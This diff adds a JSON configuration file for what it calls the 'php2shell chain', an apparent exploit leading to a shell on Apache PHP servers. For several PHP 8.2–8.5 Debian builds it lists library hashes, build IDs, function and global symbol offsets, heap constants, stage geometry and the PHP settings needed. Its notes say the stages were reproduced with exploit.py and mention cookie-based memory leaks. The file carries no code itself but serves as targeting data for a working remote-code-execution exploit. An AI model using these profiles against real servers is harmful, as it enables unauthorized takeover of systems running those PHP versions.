@@ -1,0 +1,188 @@
+{
+  "schema": 1,
+  "note": "Verified build profiles for the php2shell chain. Key on the libphp.so sha256/build-id, not the PHP version alone: the same version built for another distro or with other flags has different symbol offsets. htdata is a config-dependent heap constant and is only valid for the recorded config.",
+  "builds": [
+    {
+      "id": "php-8.4.26-apache-debian13",
+      "php_version": "8.4.26",
+      "distro": "debian-13",
+      "arch": "x86_64",
+      "sapi": "apache2handler",
+      "libphp_sha256": "51663cf883b1223436d4c99f31dd0225735ea5573665e4242621eee7f4ee679c",
+      "build_id": "a534a5c4a890b378ef6c227590627d531eafa8ce",
+      "zif_offset": "0x465370",
+      "dtor_offset": "0x65eb60",
+      "htdata_offset": "0x690d8",
+      "in_band_leaks": true,
+      "verified": true,
+      "verified_on": "2026-10-22",
+      "verified_config": {
+        "memory_limit": "8M",
+        "post_max_size": "64M",
+        "display_errors": "On",
+        "workers": 1,
+        "session_name": "PHPSESSID"
+      },
+      "stage3_geometry": [
+        [
+          16,
+          29,
+          48,
+          "0x740d8",
+          15,
+          15
+        ],
+        [
+          32,
+          29,
+          48,
+          "0x740d8",
+          15,
+          15
+        ],
+        [
+          64,
+          29,
+          48,
+          "0x740d8",
+          15,
+          15
+        ],
+        [
+          128,
+          29,
+          48,
+          "0x740d8",
+          15,
+          15
+        ],
+        [
+          256,
+          29,
+          48,
+          "0x740d8",
+          15,
+          15
+        ]
+      ],
+      "stage3_geometry_note": "layout after limit_mb: a_extra, f_pads, htdata_offset, carrier_len, fill_len; 8M uses the default profile values",
+      "source": "php:8.4.26-apache (official image, Debian 13 trixie)",
+      "notes": "stage1/2/3 reproduced with exploit.py --profile auto",
+      "pure128": true,
+      "pure128_geometry": [
+        1016728,
+        null,
+        500,
+        495
+      ],
+      "pure128_note": "Verified on php:8.4.26-apache + php.ini-production (de=Off, 128M, post 8M): single worker 5/5; 2w/5w 10/10 with N-1 FileWorkerPinner and session.save_path=/tmp. 8M geometry is not calibrated (docs/research/t2-t3.md T3).",
+      "ps_globals_offset": "0x1316820",
+      "pure128_delta": [
+        "0x1a00000",
+        "0x1f00000"
+      ]
+    },
+    {
+      "id": "php-8.5.11-apache-debian13",
+      "php_version": "8.5.11",
+      "distro": "debian-13",
+      "arch": "x86_64",
+      "sapi": "apache2handler",
+      "libphp_sha256": "2c80ca2a245ca1ccca9946f30ebeca210b9689bc24f2bd07eda717d70108ee5d",
+      "build_id": "13ba090198423880ce5847c4e3f92c48f2385a72",
+      "zif_offset": "0x5996e0",
+      "dtor_offset": "0x7b47a0",
+      "htdata_offset": "0x690d8",
+      "in_band_leaks": true,
+      "verified": true,
+      "verified_on": "2026-10-22",
+      "verified_config": {
+        "memory_limit": "8M",
+        "post_max_size": "64M",
+        "display_errors": "On",
+        "workers": 1,
+        "session_name": "PHPSESSID"
+      },
+      "source": "php:8.5.11-apache (official image, Debian 13 trixie)",
+      "notes": "also reproduced at memory_limit=16M with huge=20MB",
+      "ps_globals_offset": "0x1771a40"
+    },
+    {
+      "id": "php-8.3.35-apache-debian13",
+      "php_version": "8.3.35",
+      "distro": "debian-13",
+      "arch": "x86_64",
+      "sapi": "apache2handler",
+      "libphp_sha256": "ea069762fa225a2d61ebf613db5686d7c29823acf641424d596f78fcaa1cdccb",
+      "build_id": "6750eb9dbdf140fb6f76592d078784272ec1c7ca",
+      "zif_offset": "0x3ac080",
+      "dtor_offset": "0x49ec50",
+      "htdata_offset": "0x6a0d8",
+      "in_band_leaks": true,
+      "verified": true,
+      "verified_on": "2026-10-22",
+      "verified_config": {
+        "memory_limit": "8M",
+        "post_max_size": "64M",
+        "display_errors": "On",
+        "workers": 1,
+        "session_name": "PHPSESSID"
+      },
+      "source": "php:8.3.35-apache (official image, Debian 13 trixie)",
+      "notes": "requires the second 2MB heap candidate; stage1_candidates(4) handles it",
+      "ps_globals_offset": "0x10432a0"
+    },
+    {
+      "id": "php-8.2.34-apache-debian12",
+      "php_version": "8.2.34",
+      "distro": "debian-12",
+      "arch": "x86_64",
+      "sapi": "apache2handler",
+      "libphp_sha256": "42ae9f69550e036ff5ad3d25d7ebf6b40bf2dd6531e8f891de53bea0d1663e9b",
+      "build_id": "432b9cdfc44ab0205ee9f81d234d14e474e9aeb6",
+      "zif_offset": "0x39b8a0",
+      "dtor_offset": "0x487650",
+      "htdata_offset": "0x6a0d8",
+      "in_band_leaks": false,
+      "verified": true,
+      "verified_on": "2026-10-22",
+      "verified_config": {
+        "memory_limit": "8M",
+        "post_max_size": "64M",
+        "display_errors": "On",
+        "workers": 1,
+        "session_name": "PHPSESSID"
+      },
+      "source": "php:8.2.34-apache",
+      "notes": "psv=chunk+0x56180; PS(http_session_vars)=ps_globals+0x140; carrier f_pads=2; in-band cookie leak unavailable; /proc/1/maps lab path",
+      "ps_globals_offset": "0xf3a120",
+      "psv_offset": "0x140"
+    },
+    {
+      "id": "php-8.2.12-apache-debian12",
+      "php_version": "8.2.12",
+      "distro": "debian-12",
+      "arch": "x86_64",
+      "sapi": "apache2handler",
+      "libphp_sha256": "689774cc5bc19a64dfb017588e3496a7609dfd2dcfc253755e90de35b4c821b0",
+      "build_id": "5ad92f8f9a6262a09ee3590d1e4a64aaf20eba87",
+      "zif_offset": "0x398ec0",
+      "dtor_offset": "0x4807d0",
+      "htdata_offset": "0x740d8",
+      "in_band_leaks": false,
+      "verified": true,
+      "verified_on": "2026-10-22",
+      "verified_config": {
+        "memory_limit": "8M",
+        "post_max_size": "64M",
+        "display_errors": "On",
+        "workers": 1,
+        "session_name": "PHPSESSID"
+      },
+      "source": "php:8.2.12-apache",
+      "notes": "psv=chunk+0x56180; PS(http_session_vars)=ps_globals+0x140; carrier f_pads=3; in-band cookie leak unavailable (8.2 clears send_cookie); /proc/1/maps lab path",
+      "ps_globals_offset": "0xf2e280",
+      "psv_offset": "0x140"
+    }
+  ]
+}
